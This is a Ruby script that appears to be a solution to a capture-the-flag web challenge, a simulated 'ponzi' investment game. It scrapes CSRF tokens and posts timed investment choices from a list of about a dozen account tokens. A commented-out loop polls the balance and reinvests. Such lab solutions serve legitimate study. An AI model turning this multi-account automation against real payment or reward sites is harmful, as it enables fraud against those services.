require 'rubygems'
require 'nokogiri'
require 'open-uri'
require 'httparty'

base_url = "http://eductf.zoolab.org:17385/"

acc = [
	"B5IoWWHayFWQFXyxmVIQ7Q",
	"FQplOI_Uf-e0gkIcObxkXw",
	"hsxaYc75SxcEqqZGLeYMUA",
	"MYj-rMwB3Pt8DXYRVowIUQ",
	"2OTqPYbhqJQjttEKz8DCLA",
	"QL9aLQJxnUJ2MsHCfvALIw",
	"1h033E6OtKmjfmd7iG8tLw",
	"FgdvxD9De-eNc5Cl2qkaHw",
	"A4j4D98_B341dc2qf6yirw",
	"ZaTfcDQuKm0WvGEHpjq_WQ",
	"xCEDlDCP-YaMMvmZ0dX_FQ"
]

# send invest data
url = base_url + acc[0]
page = Nokogiri::HTML(open(url))
csrf = page.css('input[name=csrf]')[0]['value']

data = {
	'plan' => '2',
	'csrf' => csrf
}
HTTParty.post(url, :body => data)

sleep(3598)

for i in 1..10 do 
	url = base_url + acc[i]
	page = Nokogiri::HTML(open(url+acc[i]))   
	csrf = page.css('input[name=csrf]')[0]['value']

	data = {
		'plan' => '0',
		'csrf' => csrf
	}
	HTTParty.post(url, :body => data)
end


# while true
# 	page = Nokogiri::HTML(open(url))   
# 	csrf = page.css('input[name=csrf]')[0]['value']
# 	money = page.css('b')[0].text[2..].to_i
# 	puts page.css('b')[0].text + " !!!"
# 	ponzi_current_money = page.css('li')[0].text
# 	puts ponzi_current_money
# 	ponzi_current_money = ponzi_current_money[ponzi_current_money.rindex(' ')+1..].to_i

# 	if page.css('p')[1].text[0..2] == "You" || money >= 10000
# 		break
# 	end

# 	if ponzi_current_money < money*2
# 		sleep(1)
# 		puts "maybe bankruptcy!\n\n"
# 		next
# 	end

# 	puts csrf

# 	data = {
# 		'plan' => '0',
# 		'csrf' => csrf
# 	}

# 	response = HTTParty.post(url, :body => data)
# 	html = Nokogiri::HTML(response)
# 	if html.css('p').text == 'Invalid CSRF token'
# 		break
# 	end
# 	sleep(6)
# 	puts "\n"
# end